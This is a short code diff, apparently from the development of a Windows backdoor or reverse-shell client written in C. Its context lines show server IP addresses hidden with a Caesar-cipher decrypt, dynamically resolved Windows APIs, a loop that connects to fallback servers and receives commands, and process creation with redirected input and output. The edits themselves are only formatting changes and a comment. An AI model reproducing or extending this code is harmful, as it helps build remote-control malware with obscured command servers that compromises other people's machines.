@@ -32,7 +32,7 @@ DWORD WINAPI redirect_i_thread(LPVOID lpParameter) {
 			break;
 		}
 		else {
-			Api.Sleep(50);
+			Sleep_(50);
 		}
 	}
 
@@ -110,7 +110,7 @@ char* fallback_servers[4];
 int serv = -1;
 int main() {
 	InitApis();
-	
+
 	Message();
 
 	fallback_servers[0] = CAESAR_DECRYPT("6>736;=3638:");
@@ -144,7 +144,7 @@ retry:
 	}
 
 	serv++;
-	if (serv > FALLBACK_SERVERS-1) {
+	if (serv > FALLBACK_SERVERS - 1) {
 		serv = 0;
 	}
 	server.sin_addr.s_addr = Api.inet_addr(fallback_servers[serv]);
@@ -179,7 +179,7 @@ retry:
 		*/
 
 		//Receive a reply from the server
-		if (Api.recv(sock, server_reply, BUFFER_SIZE, 0) < 0)
+		if (Api.recv(sock, server_reply, BUFFER_SIZE, 0) < 0) //access violation
 		{
 			//recv failed
 			Sleep_(Sleep_TIME);
@@ -237,7 +237,7 @@ retry:
 				goto retry;
 			}
 
-			watch_process_args args = { sock, pi.hProcess};
+			watch_process_args args = { sock, pi.hProcess };
 			HANDLE hThread3 = Api.CreateThread(NULL, 0, &watch_process, &args, 0, NULL);
 
 			// Wait for the process to finish
